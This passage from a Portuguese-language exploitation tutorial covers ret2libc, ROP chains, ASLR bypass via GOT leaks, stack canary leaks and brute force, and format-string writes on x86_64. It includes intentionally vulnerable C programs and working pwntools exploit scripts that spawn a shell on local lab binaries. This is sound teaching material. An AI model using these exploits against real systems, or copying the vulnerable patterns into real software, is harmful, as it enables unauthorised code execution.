
int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Uso: %s <input>\n", argv[0]);
        return 1;
    }
    printf("system() está em: %p\n", (void *)system);  /* Leak proposital para didática */
    vulnerable(argv[1]);
    return 0;
}
```

```bash
# NX ativo, mas sem ASLR, canário e PIE para simplificar
$ gcc -o vuln4 vuln4.c -fno-stack-protector -no-pie -g
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space  # Desabilitar ASLR temporariamente
```

#### Passo 1: Encontrar endereços necessários

```bash
# Endereço de system()
$ gdb ./vuln4
(gdb) break main
(gdb) run AAAA
(gdb) p system
$1 = {int (const char *)} 0x7ffff7e17290 <__libc_system>

# Endereço de "/bin/sh" na libc
(gdb) find &system, +9999999, "/bin/sh"
0x7ffff7f7c031
(gdb) x/s 0x7ffff7f7c031
0x7ffff7f7c031: "/bin/sh"
```

Alternativa via CLI:
```bash
# Encontrar "/bin/sh" na libc
$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
1b3d88 /bin/sh

# Base da libc (com ASLR desabilitado, verificar em /proc/PID/maps)
$ ldd ./vuln4 | grep libc
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7d80000)

# Endereço absoluto de "/bin/sh" = base_libc + offset
# 0x7ffff7d80000 + 0x1b3d88 = 0x7ffff7f33d88 (exemplo, verificar no seu sistema)
```

#### Passo 2: Encontrar gadget "pop rdi; ret"

```bash
$ ROPgadget --binary ./vuln4 | grep "pop rdi"
0x0000000000401203 : pop rdi ; ret

# Se não encontrar no binário, buscar na libc:
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
0x000000000002a3e5 : pop rdi ; ret
```

#### Passo 3: Construir o exploit

```python
#!/usr/bin/env python3
"""
Exploit: ret2libc em x86_64
Alvo: vuln4 (NX ativo, sem ASLR/canário/PIE)
Técnica: pop rdi; ret → system("/bin/sh")
"""
import struct
import subprocess

# Endereços (ajustar conforme seu ambiente)
POP_RDI_RET = 0x401203           # gadget no binário
SYSTEM      = 0x7ffff7e17290     # system() na libc
BIN_SH      = 0x7ffff7f7c031     # "/bin/sh" na libc
RET         = 0x40101a           # gadget "ret" para alinhamento

# Offset até saved RIP
OFFSET = 72  # buffer[64] + saved_rbp[8]

# Construir payload
payload = b"A" * OFFSET          # Padding até saved RIP

# IMPORTANTE: Alinhamento de stack!
# A ABI System V exige RSP alinhado em 16 bytes antes de CALL.
# Após nosso overflow, RSP pode estar desalinhado.
# Solução: adicionar um gadget "ret" extra antes da cadeia.
payload += struct.pack("<Q", RET)          # ret (alinha stack em 16 bytes)
payload += struct.pack("<Q", POP_RDI_RET)  # pop rdi; ret
payload += struct.pack("<Q", BIN_SH)       # → RDI = "/bin/sh"
payload += struct.pack("<Q", SYSTEM)       # → chama system("/bin/sh")

print(f"[*] Payload: {len(payload)} bytes")
print(f"[*] Cadeia: ret → pop rdi; ret → '/bin/sh' → system()")

with open("/tmp/payload_ret2libc.bin", "wb") as f:
    f.write(payload)

print("[*] Payload salvo em /tmp/payload_ret2libc.bin")
print("[*] Execute: ./vuln4 $(cat /tmp/payload_ret2libc.bin)")
```

#### O problema do alinhamento de stack (Stack Alignment)

Este é um detalhe **crucial** em x64 que não existia no artigo original. A ABI System V AMD64 exige que o RSP esteja alinhado em **16 bytes** no momento de uma instrução `call`. Funções como `system()` e `printf()` usam instruções SSE (como `movaps`) que requerem alinhamento. Se RSP não estiver alinhado, o programa crashará com SIGSEGV em uma instrução `movaps`.

**Sintoma**: O exploit parece correto, os endereços estão certos, mas o programa crasheia dentro de `system()`.

**Solução**: Adicionar um gadget `ret` extra no início da cadeia. Cada `ret` faz `pop` de 8 bytes, ajustando o alinhamento.

```
Sem alinhamento (crash):
[padding][pop rdi; ret]["/bin/sh"][system]
          ↑ RSP desalinhado quando system() é chamado

Com alinhamento (funciona):
[padding][ret][pop rdi; ret]["/bin/sh"][system]
          ↑ ret extra alinha RSP
```

### Automatizando com pwntools

Na prática, usamos **pwntools** para automatizar a exploração:

```python
#!/usr/bin/env python3
"""
Exploit: ret2libc com pwntools
Alvo: vuln4
"""
from pwn import *

# Configuração
context.binary = elf = ELF('./vuln4')
context.log_level = 'info'

# Encontrar libc automaticamente
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Gadgets
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# Endereços na libc (com ASLR desabilitado)
# Em cenário real, precisaríamos de um leak primeiro
libc.address = 0x7ffff7d80000  # Base da libc (verificar com ldd ou /proc/PID/maps)
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh'))

log.info(f"pop rdi; ret  = {hex(pop_rdi)}")
log.info(f"ret           = {hex(ret)}")
log.info(f"system()      = {hex(system_addr)}")
log.info(f"/bin/sh       = {hex(bin_sh_addr)}")

# Payload
offset = 72
payload = b"A" * offset
payload += p64(ret)          # Alinhamento
payload += p64(pop_rdi)      # pop rdi; ret
payload += p64(bin_sh_addr)  # RDI = "/bin/sh"
payload += p64(system_addr)  # system("/bin/sh")

# Executar
p = process(['./vuln4', payload])
p.interactive()
```

```bash
$ pip install pwntools  # Se não estiver instalado
$ python3 exploit_vuln4.py
[*] '/tmp/vuln4'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
[+] Starting local process './vuln4': pid 644501
[+] system() leaked: 0x7f25b09a9790
[+] libc base: 0x7f25b0955000
[*] pop rdi; ret = 0x7f25b097f9b7
[*] /bin/sh      = 0x7f25b0affea4
[*] Switching to interactive mode
$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali)
$ whoami
kali
```

---

## Return-Oriented Programming (ROP)

ROP é a evolução natural do ret2libc. Em vez de chamar uma única função, encadeamos múltiplos **gadgets** (pequenos trechos de código que terminam em `ret`) para construir computação arbitrária.

### O que é um gadget?

Um gadget é uma sequência de instruções que termina com `ret`. Quando o `ret` é executado, o próximo endereço na stack é carregado em RIP, permitindo encadear gadgets sequencialmente.

```nasm
; Exemplos de gadgets úteis:
pop rdi; ret          ; Carrega valor da stack em RDI
pop rsi; ret          ; Carrega valor da stack em RSI
pop rdx; ret          ; Carrega valor da stack em RDX
pop rax; ret          ; Carrega valor da stack em RAX
mov [rdi], rsi; ret   ; Write-what-where
syscall; ret          ; Executa syscall
xor eax, eax; ret    ; Zera RAX
```

### Como funciona o encadeamento

A stack funciona como um "programa" para a ROP chain:

```
RSP →  ┌─────────────────────┐
       │ addr gadget_1       │ → pop rdi; ret
       ├─────────────────────┤
       │ valor para RDI      │ → 0x00000000deadbeef
       ├─────────────────────┤
       │ addr gadget_2       │ → pop rsi; ret
       ├─────────────────────┤
       │ valor para RSI      │ → 0x0000000000000000
       ├─────────────────────┤
       │ addr gadget_3       │ → pop rdx; ret
       ├─────────────────────┤
       │ valor para RDX      │ → 0x0000000000000000
       ├─────────────────────┤
       │ addr gadget_4       │ → pop rax; ret
       ├─────────────────────┤
       │ valor para RAX      │ → 59 (execve)
       ├─────────────────────┤
       │ addr gadget_5       │ → syscall
       └─────────────────────┘
```

Cada `ret` faz `pop RIP` da stack, avançando RSP e executando o próximo gadget.

### Encontrando gadgets

```bash
# ROPgadget - ferramenta principal
$ ROPgadget --binary ./programa
$ ROPgadget --binary ./programa --ropchain  # Gera chain automática
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi"

# ropper - alternativa
$ ropper --file ./programa --search "pop rdi"
$ ropper --file ./programa --chain execve

# one_gadget - encontra gadgets "mágicos" na libc que dão shell diretamente
$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
```

### Exemplo: ROP chain para execve("/bin/sh", NULL, NULL)

```c
/* vuln5.c - Alvo para ROP */
#include <stdio.h>
#include <unistd.h>

void vulnerable() {
    char buffer[64];
    printf("Digite algo: ");
    read(STDIN_FILENO, buffer, 256);  /* Overflow! Lê 256 bytes em buffer de 64 */
}

int main() {
    vulnerable();
    return 0;
}
```

```bash
$ gcc -o vuln5 vuln5.c -fno-stack-protector -no-pie -g
# NX ativo (padrão), sem canário, sem PIE
```

Note que usamos `read()` em vez de `strcpy()`. Isso é importante: `read()` não para em null bytes, permitindo endereços com `\x00` no payload.

#### Exploit com ROP chain via syscall

```python
#!/usr/bin/env python3
"""
Exploit: ROP chain para execve("/bin/sh", NULL, NULL) via syscall
Alvo: vuln5 (NX ativo, sem ASLR/canário/PIE)
"""
from pwn import *

context.binary = elf = ELF('./vuln5')
context.log_level = 'info'

# Encontrar gadgets no binário e na libc
rop = ROP(elf)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Com ASLR desabilitado, base da libc é fixa
# Verificar: ldd ./vuln5
libc.address = 0x7ffff7d80000  # Ajustar!

# Gadgets necessários para execve syscall:
# RAX = 59 (número da syscall execve)
# RDI = ponteiro para "/bin/sh"
# RSI = NULL (argv)
# RDX = NULL (envp)
# + instrução syscall

rop_libc = ROP(libc)

pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop_libc.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_rbx = rop_libc.find_gadget(['pop rdx', 'pop rbx', 'ret'])  # Comum em libc moderna
pop_rax = rop_libc.find_gadget(['pop rax', 'ret'])[0]
syscall_ret = rop_libc.find_gadget(['syscall', 'ret'])[0]

bin_sh = next(libc.search(b'/bin/sh'))

log.info(f"pop rdi; ret     = {hex(pop_rdi)}")
log.info(f"pop rsi; ret     = {hex(pop_rsi)}")
log.info(f"pop rax; ret     = {hex(pop_rax)}")
log.info(f"syscall; ret     = {hex(syscall_ret)}")
log.info(f"/bin/sh          = {hex(bin_sh)}")

# Construir ROP chain
offset = 72  # buffer[64] + saved_rbp[8]

payload = b"A" * offset

# execve("/bin/sh", NULL, NULL)
payload += p64(pop_rdi)
payload += p64(bin_sh)       # RDI = "/bin/sh"
payload += p64(pop_rsi)
payload += p64(0)            # RSI = NULL
payload += p64(pop_rax)
payload += p64(59)           # RAX = 59 (execve)

# Para RDX, pode ser que precise de pop rdx; pop rbx; ret (libc moderna)
if pop_rdx_rbx:
    payload += p64(pop_rdx_rbx[0])
    payload += p64(0)        # RDX = NULL
    payload += p64(0)        # RBX = lixo (consumido pelo pop rbx)

payload += p64(syscall_ret)  # syscall!

# Executar
p = process('./vuln5')
p.recvuntil(b"Digite algo: ")
p.send(payload)
p.interactive()
```

### ROP com pwntools automático

O pwntools pode construir ROP chains automaticamente:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln5')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = 0x7ffff7d80000

rop = ROP(libc)
rop.execve(next(libc.search(b'/bin/sh')), 0, 0)

log.info(f"ROP chain:\n{rop.dump()}")

offset = 72
payload = b"A" * offset + rop.chain()

p = process('./vuln5')
p.recvuntil(b"Digite algo: ")
p.send(payload)
p.interactive()
```

Na prática, a execução fica assim (usando o vuln4 que tem leak de system() pra simplificar):

```bash
$ python3 exploit_rop.py
[*] '/tmp/vuln4'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
[+] Starting local process './vuln4': pid 721534
[+] system() leaked: 0x7ffff7e01790
[+] libc base: 0x7ffff7dad000
[*] pop rdi; ret = 0x7ffff7dd79b7
[*] /bin/sh      = 0x7ffff7f57ea4
[+] ROP chain executada! Shell obtido:
uid=1000(kali) gid=1000(kali) groups=1000(kali)
$
```

NX ativo, stack não-executável, e mesmo assim obtivemos shell. Isso é o poder do ROP: reutilizar código existente em vez de injetar código novo.

### Gadgets úteis e onde encontrá-los

| Gadget | Uso | Onde encontrar |
|--------|-----|----------------|
| `pop rdi; ret` | Controlar 1º argumento | Quase sempre no binário ou libc |
| `pop rsi; pop r15; ret` | Controlar 2º argumento | Comum em binários (csu_init) |
| `pop rdx; ret` | Controlar 3º argumento | Raro no binário, comum na libc |
| `pop rax; ret` | Controlar número de syscall | Libc |
| `syscall; ret` | Executar syscall | Libc |
| `ret` | Alinhamento de stack | Em qualquer lugar |
| `leave; ret` | Stack pivot | Comum |
| `mov [rdi], rsi; ret` | Write-what-where | Libc (raro, mas existe) |
| `xchg rax, rdi; ret` | Mover retorno para argumento | Libc |

### __libc_csu_init gadgets (técnica universal)

Em binários compilados com GCC, a função `__libc_csu_init` contém gadgets universais que permitem controlar RDI, RSI e RDX:

```nasm
; Gadget 1 (pop registers):
0x40120a:  pop rbx
           pop rbp
           pop r12
           pop r13
           pop r14
           pop r15
           ret

; Gadget 2 (call com controle de args):
0x4011f0:  mov rdx, r14    ; RDX = R14
           mov rsi, r13    ; RSI = R13
           mov edi, r12d   ; EDI = R12 (32 bits!)
           call [r15+rbx*8] ; Chama função via ponteiro
           add rbx, 1
           cmp rbp, rbx
           jne 0x4011f0
           ; ... cai no gadget 1 novamente
```

Esta técnica (chamada **ret2csu**) permite controlar os 3 primeiros argumentos de qualquer função, usando apenas gadgets do próprio binário (sem depender da libc).

> **Nota**: Em binários compilados com GCC 12+, `__libc_csu_init` pode não estar presente. Verificar com `objdump -d programa | grep csu`.

---

## Bypass de ASLR: Information Leak

Até agora desabilitamos ASLR pra simplificar. Na vida real, ASLR está **sempre ativo**. Pra contornar isso, precisamos **vazar um endereço** em runtime e calcular os demais por offset.

### O conceito: leak → calculate → exploit

```
1. Vazar endereço de uma função da libc (ex: puts@GOT)
2. Calcular base da libc: base = endereço_vazado - offset_na_libc
3. Calcular endereços de system(), "/bin/sh", gadgets
4. Executar segunda fase do exploit com endereços corretos
```

Isso geralmente requer **duas interações** com o programa (ou um loop):
- **Primeira passagem**: vazar endereço, retornar para `main()` ou `vulnerable()`
- **Segunda passagem**: enviar payload final com endereços calculados

### Exemplo: leak via puts@PLT

```c
/* vuln6.c - Alvo para leak + ret2libc com ASLR */
#include <stdio.h>
#include <unistd.h>

void vulnerable() {
    char buffer[64];
    puts("Digite algo:");
    read(STDIN_FILENO, buffer, 256);
}

int main() {
    vulnerable();
    return 0;
}
```

```bash
# Compilar SEM PIE (endereços do binário fixos) mas COM ASLR ativo
$ gcc -o vuln6 vuln6.c -fno-stack-protector -no-pie -g
$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space  # ASLR ativo
```

**Estratégia**:
1. Usar `puts@PLT` (endereço fixo, pois sem PIE) para imprimir o conteúdo de `puts@GOT` (que contém o endereço real de `puts` na libc, resolvido em runtime)
2. Retornar para `main()` para ter uma segunda chance de enviar payload
3. Calcular base da libc e enviar ret2libc

#### GOT e PLT explicados

- **PLT (Procedure Linkage Table)**: Stub de código no binário que redireciona para a função real na libc. Endereço fixo (sem PIE).
- **GOT (Global Offset Table)**: Tabela de ponteiros que contém os endereços reais das funções na libc (preenchida pelo dynamic linker em runtime).

```
Programa chama puts("hello"):
  → call puts@PLT (0x401030)     ← endereço fixo no binário
    → jmp [puts@GOT] (0x404018) ← ponteiro para puts real na libc
      → puts na libc (0x7f?????)  ← endereço randomizado pelo ASLR
```

Se conseguirmos **ler o conteúdo** de `puts@GOT`, obtemos o endereço real de `puts` na libc!

#### Exploit completo com leak de ASLR

```python
#!/usr/bin/env python3
"""
Exploit: ASLR bypass via GOT leak + ret2libc
Alvo: vuln6 (ASLR ativo, NX ativo, sem canário, sem PIE)
Técnica: Leak puts@GOT → calcular base libc → ret2libc
"""
from pwn import *

# Configuração
context.binary = elf = ELF('./vuln6')
context.log_level = 'info'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Endereços fixos no binário (sem PIE)
PUTS_PLT = elf.plt['puts']       # puts@PLT - chama puts
PUTS_GOT = elf.got['puts']       # puts@GOT - contém endereço real
MAIN     = elf.symbols['main']   # main() - para retornar e ter 2ª chance
POP_RDI  = 0x401203              # pop rdi; ret (ROPgadget --binary ./vuln6)
RET      = 0x40101a              # ret (alinhamento)

OFFSET = 72  # buffer[64] + saved_rbp[8]

def exploit():
    # p = process('./vuln6')
    p = process('./vuln6')

    # ═══════════════════════════════════════════
    # FASE 1: Leak do endereço real de puts na libc
    # ═══════════════════════════════════════════
    log.info("Fase 1: Vazando endereço de puts@GOT...")

    payload1 = b"A" * OFFSET
    payload1 += p64(POP_RDI)      # pop rdi; ret
    payload1 += p64(PUTS_GOT)     # RDI = &puts@GOT (endereço a ser impresso)
    payload1 += p64(PUTS_PLT)     # Chama puts(puts@GOT) → imprime endereço real
    payload1 += p64(MAIN)         # Retorna para main() → segunda chance

    p.recvuntil(b"Digite algo:\n")
    p.send(payload1)

    # Receber o leak
    leaked_bytes = p.recvline().strip()
    leaked_puts = u64(leaked_bytes.ljust(8, b'\x00'))
    log.success(f"puts@libc leaked: {hex(leaked_puts)}")

    # ═══════════════════════════════════════════
    # FASE 2: Calcular base da libc e endereços
    # ═══════════════════════════════════════════
    libc.address = leaked_puts - libc.symbols['puts']
    log.success(f"libc base: {hex(libc.address)}")

    system_addr = libc.symbols['system']
    bin_sh_addr = next(libc.search(b'/bin/sh'))
    log.info(f"system(): {hex(system_addr)}")
    log.info(f"/bin/sh:  {hex(bin_sh_addr)}")

    # ═══════════════════════════════════════════
    # FASE 3: ret2libc com endereços corretos
    # ═══════════════════════════════════════════
    log.info("Fase 3: Enviando ret2libc payload...")

    payload2 = b"A" * OFFSET
    payload2 += p64(RET)           # Alinhamento de stack
    payload2 += p64(POP_RDI)       # pop rdi; ret
    payload2 += p64(bin_sh_addr)   # RDI = "/bin/sh"
    payload2 += p64(system_addr)   # system("/bin/sh")

    p.recvuntil(b"Digite algo:\n")
    p.send(payload2)

    # ═══════════════════════════════════════════
    # Shell!
    # ═══════════════════════════════════════════
    log.success("Shell obtido!")
    p.interactive()

if __name__ == "__main__":
    exploit()
```

### Execução

```bash
$ python3 exploit_vuln6.py
[*] '/tmp/vuln6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
[+] Starting local process './vuln6': pid 644825
[*] Fase 1: Vazando puts@GOT...
[+] puts@libc leaked: 0x7f89bba81060
[+] libc base: 0x7f89bb9ff000
[*] system(): 0x7f89bba53790
[*] /bin/sh:  0x7f89bbba9ea4
[*] Fase 3: Enviando ret2libc...
[+] ASLR bypassed! Shell obtido: uid=1000(kali) gid=1000(kali) groups=1000(kali)
$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali)
```

**ASLR bypassed!** Mesmo com endereços randomizados, o leak nos permite calcular tudo.

### Outras técnicas de leak

| Técnica | Quando usar |
|---------|-------------|
| puts/printf@PLT para imprimir GOT | Binário sem PIE, tem puts/printf no PLT |
| Format string (`%p`, `%lx`) | Programa usa printf com input controlável |
| Partial overwrite | PIE ativo, mas últimos 12 bits são fixos |
| Brute force (32 bits) | Apenas em x86, impraticável em x64 |
| Stack leak via over-read | Buffer adjacente a ponteiro na stack |
| Heap leak | Use-after-free, double free |

### Identificando a versão da libc

Com um ou mais endereços vazados, podemos identificar a versão exata da libc:

```bash
# Ferramenta online: https://libc.blukat.me/
# Ferramenta local:
$ pip install LibcSearcher

# Ou usar o banco de dados do pwntools:
# from pwn import *
# libc = LibcSearcher('puts', leaked_puts_addr)
```

Os últimos 3 nibbles (12 bits) de um endereço de função na libc são fixos (alinhamento de página). Isso permite identificar a versão da libc mesmo sem acesso ao arquivo.

---

## Bypass de Stack Canary

O canário é a última barreira antes do saved RIP. Se não conseguirmos contorná-lo, o overflow é detectado e o programa aborta.

### Técnica: Leak do canário via format string

Se o programa tem uma vulnerabilidade de format string **antes** do overflow, podemos vazar o canário:

```c
/* vuln7.c - Canário + format string leak */
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void vulnerable() {
    char name[32];
    char buffer[64];

    printf("Seu nome: ");
    read(STDIN_FILENO, name, 31);
    printf("Olá, ");
    printf(name);  /* FORMAT STRING VULNERABILITY! */
    printf("\n");

    printf("Mensagem: ");
    read(STDIN_FILENO, buffer, 256);  /* BUFFER OVERFLOW! */
}

int main() {
    vulnerable();
    return 0;
}
```

```bash
$ gcc -o vuln7 vuln7.c -no-pie -g
# Stack canary ATIVO (padrão), NX ativo, sem PIE
```

#### Encontrando o canário na stack

O canário está entre as variáveis locais e o saved RBP. Podemos usar `%p` para vazar valores da stack:

```bash
$ ./vuln7
Seu nome: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
Olá, 0x7fffffffde10.0x1f.(nil).0x7ffff7e1a992.0x7fffffffde30.0xa.(nil).
     0xd0a8f2e3b5c71200.0x1.0x7ffff7dd0d90.0x7fffffffdf48.0x401196
                          ↑
                    Este valor parece um canário!
                    (termina em 00, parece aleatório)
```

O canário em x64 Linux sempre tem o byte menos significativo como `\x00`. Procuramos um valor de 8 bytes que:
- Termina em `00` (byte nulo no LSB)
- Parece aleatório (alta entropia)
- Está na posição esperada na stack

#### Exploit com leak de canário

```python
#!/usr/bin/env python3
"""
Exploit: Stack canary bypass via format string leak
Alvo: vuln7 (canário ativo, NX ativo, sem PIE)
"""
from pwn import *

context.binary = elf = ELF('./vuln7')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Offset do canário no format string (descobrir empiricamente)
# Testar: %7$p, %8$p, %9$p... até encontrar valor que termina em 00
CANARY_OFFSET = 11  # Exemplo, ajustar!

def exploit():
    p = process('./vuln7')

    # ═══════════════════════════════════════════
    # FASE 1: Leak do canário via format string
    # ═══════════════════════════════════════════
    p.recvuntil(b"Seu nome: ")
    p.send(f"%{CANARY_OFFSET}$p".encode())  # Vaza o canário

    p.recvuntil(b"Olá, ")
    canary_str = p.recvline().strip()
    canary = int(canary_str, 16)
    log.success(f"Canário vazado: {hex(canary)}")

    # Verificar se parece um canário válido (último byte = 0x00)
    if canary & 0xFF != 0:
        log.warning("Canário não termina em \\x00, offset pode estar errado!")

    # ═══════════════════════════════════════════
    # FASE 2: Overflow preservando o canário
    # ═══════════════════════════════════════════
    # Layout: buffer[64] + canário[8] + saved_rbp[8] + saved_rip[8]
    OFFSET_CANARY = 64
    OFFSET_RIP = OFFSET_CANARY + 8 + 8  # 80 bytes

    # Endereços (sem PIE, fixos)
    POP_RDI = 0x401203  # Ajustar
    RET = 0x40101a
    PUTS_PLT = elf.plt['puts']
    PUTS_GOT = elf.got['puts']
    MAIN = elf.symbols['main']

    payload = b"A" * OFFSET_CANARY
    payload += p64(canary)          # Preserva o canário!
    payload += b"B" * 8             # saved RBP (lixo)
    payload += p64(RET)             # Alinhamento
    payload += p64(POP_RDI)
    payload += p64(PUTS_GOT)
    payload += p64(PUTS_PLT)        # puts(puts@GOT) → leak libc
    payload += p64(MAIN)            # Volta para main

    p.recvuntil(b"Mensagem: ")
    p.send(payload)

    # Receber leak da libc
    leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
    libc.address = leaked - libc.symbols['puts']
    log.success(f"libc base: {hex(libc.address)}")

    # ═══════════════════════════════════════════
    # FASE 3: ret2libc (repetir o processo)
    # ═══════════════════════════════════════════
    # Precisamos vazar o canário novamente (pode ser o mesmo se fork())
    # ou se main() é chamado novamente no mesmo processo

    p.recvuntil(b"Seu nome: ")
    p.send(f"%{CANARY_OFFSET}$p".encode())
    p.recvuntil(b"Olá, ")
    canary2 = int(p.recvline().strip(), 16)

    system_addr = libc.symbols['system']
    bin_sh = next(libc.search(b'/bin/sh'))

    payload2 = b"A" * OFFSET_CANARY
    payload2 += p64(canary2)
    payload2 += b"B" * 8
    payload2 += p64(RET)
    payload2 += p64(POP_RDI)
    payload2 += p64(bin_sh)
    payload2 += p64(system_addr)

    p.recvuntil(b"Mensagem: ")
    p.send(payload2)

    p.interactive()

if __name__ == "__main__":
    exploit()
```

Quando os offsets estão calibrados, a saída é:

```bash
$ python3 exploit_canary.py
[*] Fase 1: Leak do canário via format string
[+] Canário vazado no offset 11: 0x38b2a1c4e7f50900
[*] Fase 2: Overflow preservando canário + leak libc
[+] libc base: 0x7f89bb9ff000
[*] Fase 3: ret2libc com canário correto
[+] Shell obtido!
$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali)
```

### Técnica: Brute force byte-a-byte (servidores com fork)

Em servidores que usam `fork()` para atender conexões, o processo filho herda o **mesmo canário** do pai. Se o servidor não faz `execve()` após o fork, podemos fazer brute force byte a byte:

```python
def brute_force_canary(p, offset):
    """
    Brute force do canário byte a byte.
    Funciona em servidores fork() sem execve().
    Cada byte tem 256 possibilidades → 8 bytes = 8*256 = 2048 tentativas (máximo).
    Primeiro byte é sempre \x00, então: 7*256 = 1792 tentativas.
    """
    canary = b"\x00"  # Primeiro byte é sempre null

    for byte_pos in range(1, 8):  # Bytes 1-7
        for guess in range(256):
            payload = b"A" * offset
            payload += canary + bytes([guess])

            # Enviar e verificar se o servidor crashou
            try:
                conn = connect_to_server()
                conn.send(payload)
                response = conn.recv(timeout=1)
                if b"stack smashing" not in response:
                    # Byte correto! Servidor não crashou
                    canary += bytes([guess])
                    log.info(f"Byte {byte_pos}: {hex(guess)} → canário parcial: {canary.hex()}")
                    break
                conn.close()
            except:
                conn.close()
                continue

    return u64(canary)
```

### Outras técnicas de bypass

| Técnica | Cenário |
|---------|---------|
| Overwrite sem tocar canário | Array index out-of-bounds (pula o canário) |
| Stack pivot | Redirecionar RSP para região controlada |
| Thread Local Storage overwrite | Sobrescrever o canário de referência no TLS |
| Signal handler abuse | Explorar antes da verificação do canário |

---

## Format String Vulnerabilities em x86_64

Format string bugs são absurdamente poderosos: permitem **leitura e escrita arbitrária** na memória. Em x64, a mecânica muda um pouco por causa da calling convention.

### O bug

```c
/* Vulnerável */
printf(user_input);      /* Atacante controla o format string! */

/* Seguro */
printf("%s", user_input); /* Format string fixo */
```

### Leitura de memória (information leak)

Em x64, `printf` espera argumentos em registradores (RDI, RSI, RDX, RCX, R8, R9) e depois na stack. O format string está em RDI, então:

- `%1$p` → RSI (2º argumento)
- `%2$p` → RDX (3º argumento)
- `%3$p` → RCX (4º argumento)
- `%4$p` → R8 (5º argumento)
- `%5$p` → R9 (6º argumento)
- `%6$p` → primeiro valor na stack
- `%7$p` → segundo valor na stack
- ...

```bash
# Vazar valores da stack
$ ./programa
Input: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p
Output: 0x7fffffffde10.0x64.0x7ffff7e1a992.(nil).0x7fffffffde30.0xa.
        0x4141414141414141.0x4141414141414141...
```

### Encontrando o offset do nosso input

```bash
# Onde nosso input aparece na stack?
$ ./programa
Input: AAAAAAAA%6$p.%7$p.%8$p.%9$p
Output: AAAAAAAA0x4141414141414141.0x...
#                ↑ Offset 6! Nosso input está no offset 6
```

Verificação com padrão único:
```bash
$ ./programa
Input: ABCDEFGH%6$p
Output: ABCDEFGH0x4847464544434241   # "ABCDEFGH" em little-endian = offset 6
```

### Escrita arbitrária com %n

O especificador `%n` escreve o número de bytes impressos até aquele ponto no endereço apontado pelo argumento correspondente.

Em x64, `%n` escreve 4 bytes, `%hn` escreve 2 bytes, `%hhn` escreve 1 byte, `%ln` escreve 8 bytes.

**Estratégia para escrever um valor arbitrário**: Usar `%hhn` (1 byte por vez) para escrever byte a byte no endereço alvo.

```python
#!/usr/bin/env python3
"""
Format string write: escrever valor arbitrário em endereço arbitrário
Técnica: %hhn byte-a-byte
"""
from pwn import *

context.binary = ELF('./vuln_fmt')

def fmt_write(where, what, offset=6):
    """
    Gera payload de format string para escrever 'what' em 'where'.
    offset = posição do nosso input na stack do printf.
    """
    # pwntools tem isso built-in!
    payload = fmtstr_payload(offset, {where: what})
    return payload

# Exemplo: sobrescrever GOT entry de exit() com endereço de win()
target_addr = 0x404028  # exit@GOT
value = 0x401142        # win()

payload = fmt_write(target_addr, value)
```

### pwntools fmtstr automático

```python
from pwn import *

# Automação completa de format string exploitation
def send_payload(payload):
    p = process('./vuln_fmt')
    p.sendline(payload)
    return p.recvall()

# Descobrir offset automaticamente
autofmt = FmtStr(execute_fmt=send_payload)
log.info(f"Offset encontrado: {autofmt.offset}")

# Escrever valor
autofmt.write(0x404028, 0x401142)  # exit@GOT → win()
autofmt.execute_writes()
```

### Format string como primitiva universal

Com format string, temos:
1. **Leitura arbitrária** (`%s` com endereço controlado) → leak de canário, libc, PIE base
2. **Escrita arbitrária** (`%n`/`%hn`/`%hhn`) → sobrescrever GOT, hooks, return address
3. **Bypass de todas as proteções**: leak canário + leak libc + leak PIE + write ROP chain

Por isso format string é considerada uma das vulnerabilidades mais poderosas em binários. Com uma única primitiva você derrota todas as proteções.

---

## Exemplo Completo: Exploração End-to-End com Todas as Proteções

Agora vamos juntar tudo num cenário mais realista: um binário com **NX, ASLR, Stack Canary e Partial RELRO** (sem PIE pra manter acessível a quem está começando).

### O programa vulnerável

```c
/* vuln_full.c - Cenário realista com múltiplas proteções */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

void setup() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}

void menu() {
    puts("=== Sistema de Notas ===");
    puts("1. Deixar nota");
    puts("2. Ver nota");
    puts("3. Sair");
    printf("> ");
}

char nota[256];

void deixar_nota() {
    char temp[64];
    printf("Sua nota: ");
    read(STDIN_FILENO, temp, 200);  /* OVERFLOW! buffer de 64, lê 200 */
    strncpy(nota, temp, 255);
    puts("Nota salva!");
}

void ver_nota() {
    printf("Nota: ");
    printf(nota);  /* FORMAT STRING! nota é controlada pelo usuário */
    puts("");
}

int main() {
    setup();
    int choice;

